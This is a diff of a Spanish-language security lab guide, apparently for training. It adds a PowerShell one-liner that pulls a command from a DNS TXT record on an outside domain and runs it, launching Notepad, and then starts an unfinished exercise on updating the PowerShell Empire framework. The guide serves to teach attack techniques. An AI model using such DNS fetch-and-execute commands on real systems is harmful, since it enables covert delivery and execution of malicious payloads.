@@ -50,9 +50,26 @@ Observa qué ocurre cuando hacemos la consulta.
 
 En la salida podemos observar que hemos "extraído" un ***comando***.
 
-![extracción comando](../img/lab-50-C/202209142124.png)
+![extracción comando](../img/lab-50-C/202209142127.png)
 
+Vamos a ver si podemos ejecutarlo.
+```
+& powershell . (nslookup -q=txt ejecutaesto.antsala.xyz)[-1]
+```
 
+***Notepad*** se abre. ¿Mágico verdad? Hemos conseguido ejecutar el comando que se almacena en un registro TXT de la zona DNS.
+
+## Ejercicio 2: Actualizar PowerShell Empire.
+
+En la máquina ***Kali*** abrimos una terminal y ejecutamos el siguiente comando para actualizar ***PowerShell Empire***.
+```
+sudo apt install powershell-empire
+```
+
+Cuando haya terminado la actualización 
+
+TODO. 
+https://www.youtube.com/watch?v=Y3fi9pc81NY
 
 
 
